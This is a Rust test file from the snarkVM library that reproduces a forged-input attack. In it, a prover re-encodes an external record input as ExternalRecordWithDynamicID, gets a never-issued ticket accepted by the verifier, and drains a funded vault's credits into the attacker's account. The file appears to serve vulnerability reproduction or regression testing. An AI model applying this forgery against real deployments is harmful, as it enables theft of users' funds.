// Copyright (c) 2019-2026 Provable Inc.
// This file is part of the snarkVM library.

// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at:

// http://www.apache.org/licenses/LICENSE-2.0

// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

use super::*;

// TODO (Antonio) document


use crate::vm::test_helpers::sample_finalize_state;
use aleo_std::StorageMode;
use circuit::network::AleoV0;
use console::{
    account::{Address, PrivateKey},
    network::MainnetV0,
    program::{
        DynamicRecord, Identifier, InputID, Literal, Plaintext, ProgramID, Record, Value, compute_function_id,
    },
    types::{Field, U64},
};
use snarkvm_ledger_block::{Input, Transition};
use snarkvm_ledger_store::{FinalizeStore, helpers::memory::FinalizeMemory};
use snarkvm_synthesizer_process::TranslationAssignment;

use snarkvm_synthesizer_program::{FinalizeStoreTrait, Program};

type CurrentNetwork = MainnetV0;
type CurrentAleo = AleoV0;

/// Re-encodes the transition's root external-record input as `ExternalRecordWithDynamicID`
/// (the only change a malicious prover makes).
fn replace_external_input(
    transition: &Transition<CurrentNetwork>,
    dynamic_id: Field<CurrentNetwork>,
) -> Transition<CurrentNetwork> {
    let mut inputs = transition.inputs().to_vec();
    let static_id = match inputs[0] {
        Input::ExternalRecord(id) | Input::ExternalRecordWithDynamicID(id, _) => id,
        ref other => panic!("expected external-record input, found {other}"),
    };
    inputs[0] = Input::ExternalRecordWithDynamicID(static_id, dynamic_id);
    Transition::new(
        *transition.program_id(),
        *transition.function_name(),
        inputs,
        transition.outputs().to_vec(),
        *transition.tpk(),
        *transition.tcm(),
        *transition.scm(),
    )
    .unwrap()
}

#[test]
fn external_record_with_dynamic_id_drains_funded_vault() {

    let consensus_version = ConsensusVersion::V18;

    let rng = &mut TestRng::default();
    let private_key = PrivateKey::<CurrentNetwork>::new(rng).unwrap();
    let attacker = Address::try_from(private_key).unwrap();

    // Issuer defines the `ticket` external record honored by the vault.
    let issuer = Program::<CurrentNetwork>::from_str(
        r"
program root_dyn_issuer.aleo;

record ticket:
owner as address.private;
amount as u64.public;

function noop:

constructor:
assert.eq true true;
",
    )
    .unwrap();

    // Vault pays out `ticket.amount` from its own public credits to the caller.
    let vault = Program::<CurrentNetwork>::from_str(
        r"
import root_dyn_issuer.aleo;
import credits.aleo;

program root_dyn_consumer.aleo;

function claim:
input r0 as root_dyn_issuer.aleo/ticket.record;
input r1 as address.public;
call root_dyn_issuer.aleo/noop;
call credits.aleo/transfer_public r1 r0.amount into r2;
async claim r2 into r3;
output r3 as root_dyn_consumer.aleo/claim.future;

finalize claim:
input r0 as credits.aleo/transfer_public.future;
await r0;

constructor:
assert.eq true true;
",
    )
    .unwrap();

    let process = crate::Process::<CurrentNetwork>::load().unwrap();
    process.lock().add_program(&issuer).unwrap();
    process.lock().add_program(&vault).unwrap();

    // A fake `ticket`, never issued on-ledger. `amount` = funds stolen.
    let steal_amount = 4242u64;
    let record = Record::<CurrentNetwork, console::program::Plaintext<CurrentNetwork>>::from_str(&format!(
        "{{ owner: {attacker}.private, amount: {steal_amount}u64.public, _nonce: 0group.public, _version: 1u8.public }}"
    ))
    .unwrap();
    let record_value = Value::<CurrentNetwork>::Record(record.clone());
    let receiver_value = Value::<CurrentNetwork>::from_str(&attacker.to_string()).unwrap();

    let function_name = Identifier::<CurrentNetwork>::from_str("claim").unwrap();
    let authorization = process
        .authorize::<CurrentAleo, _>(
            &private_key,
            vault.id(),
            function_name,
            [record_value, receiver_value].iter(),
            rng,
        )
        .unwrap();
    let request = authorization.peek_next().unwrap();
    let tvk = *request.tvk();
    let function_id =
        compute_function_id(request.network_id(), request.program_id(), request.function_name()).unwrap();
    let id_static = match request.input_ids()[0] {
        InputID::ExternalRecord(id) => id,
        ref other => panic!("expected external-record request input id, found {other:?}"),
    };
    let dynamic_record = DynamicRecord::from_record(&record).unwrap();
    let dynamic_value = Value::DynamicRecord(dynamic_record.clone());
    let id_dynamic = match InputID::dynamic_record(function_id, &dynamic_value, tvk, 0).unwrap() {
        InputID::DynamicRecord(id) => id,
        _ => unreachable!(),
    };

    let (_response, mut trace) = process.execute::<CurrentAleo, _>(authorization, rng).unwrap();
    let root_index = trace.transitions.len() - 1;

    let global_state_root = <CurrentNetwork as Network>::StateRoot::from(Field::<CurrentNetwork>::one());

    // Control: the same fake ticket as an honest, un-forged `ExternalRecord` is rejected by
    // the V15 existence check, so an honest prover can never reach finalize / move funds.
    {
        let honest_execution =
            Execution::from(trace.transitions.iter().cloned(), global_state_root, None).unwrap();

        let honest_err = crate::Process::verify_execution(
            consensus_version,
            VarunaVersion::V2,
            InclusionVersion::V1,
            &honest_execution,
            &process.get_stacks(honest_execution.transitions(), true).unwrap(),
        )
        .unwrap_err()
        .to_string();
        assert!(
            honest_err.contains("not known to correspond to a record on the ledger"),
            "honest fake claim must be rejected by the V15 existence check; got: {honest_err}"
        );
    }

    // A real translation proving key and assignment for the dynamic-id binding.
    process
        .synthesize_translation_key::<CurrentAleo, _>(issuer.id(), &Identifier::from_str("ticket").unwrap(), rng)
        .unwrap();
    let translation_pk = process.get_proving_key(issuer.id(), Identifier::from_str("ticket").unwrap()).unwrap();
    let translation_assignment = TranslationAssignment::new(
        record,
        dynamic_record,
        *issuer.id(),
        function_id,
        Identifier::from_str("ticket").unwrap(),
        true,
        true,
        tvk,
        None,
        None,
        0,
        id_dynamic,
        id_static,
    );

    // FORGE: encode the root `ExternalRecord` input as `ExternalRecordWithDynamicID`.
    let forged_transition = replace_external_input(&trace.transitions.get(root_index).unwrap(), id_dynamic);
    trace.transitions[root_index] = forged_transition;

    let proving_tasks = trace.transition_tasks.values().cloned().collect::<Vec<_>>();
    let translation_assignments = vec![(translation_pk, vec![(translation_assignment, 0)])];
    let (_root, proof) = Trace::<CurrentNetwork>::prove_batch::<CurrentAleo, _>(
        "root_dyn_consumer.aleo/claim",
        VarunaVersion::V2,
        proving_tasks,
        &translation_assignments,
        &[],
        global_state_root,
        rng,
    )
    .unwrap();

    let forged_execution =
        Execution::from(trace.transitions.iter().cloned(), global_state_root, Some(proof)).unwrap();

    // The forged execution (never-issued ticket) is accepted by the verifier.
    crate::Process::verify_execution(
        consensus_version,
        VarunaVersion::V2,
        InclusionVersion::V1,
        &forged_execution,
        &process.get_stacks(forged_execution.transitions(), true).unwrap(),
    )
    .unwrap();

    // Apply the forged execution's finalize and observe the on-ledger balance change.
    let finalize_store =
        FinalizeStore::<CurrentNetwork, FinalizeMemory<_>>::open(StorageMode::new_test(None)).unwrap();
    let credits = ProgramID::<CurrentNetwork>::from_str("credits.aleo").unwrap();
    let account = Identifier::<CurrentNetwork>::from_str("account").unwrap();
    finalize_store.initialize_mapping(credits, account).unwrap();

    let vault_key = Plaintext::from(Literal::Address(vault.id().to_address().unwrap()));
    let attacker_key = Plaintext::from(Literal::Address(attacker));

    // Fund the vault's public credits (the funds at risk).
    finalize_store
        .update_key_value(credits, account, vault_key.clone(), Value::from(Literal::U64(U64::new(steal_amount))))
        .unwrap();

    let balance = |key: &Plaintext<CurrentNetwork>| -> u64 {
        match finalize_store.get_value_speculative(credits, account, key).unwrap() {
            Some(Value::Plaintext(Plaintext::Literal(Literal::U64(v), _))) => *v,
            _ => 0u64,
        }
    };
    assert_eq!(balance(&vault_key), steal_amount, "vault is funded before the attack");
    assert_eq!(balance(&attacker_key), 0, "attacker starts with zero balance");

    // REAL state transition: credits.aleo/transfer_public during finalize.
    process
        .lock()
        .finalize_execution(sample_finalize_state(1), &finalize_store, &forged_execution, None)
        .unwrap();

    // Fund loss: the never-issued ticket drained the vault into the attacker's account.
    assert_eq!(balance(&vault_key), 0, "vault fully drained by the forged ticket");
    assert_eq!(balance(&attacker_key), steal_amount, "attacker received the stolen funds");
}
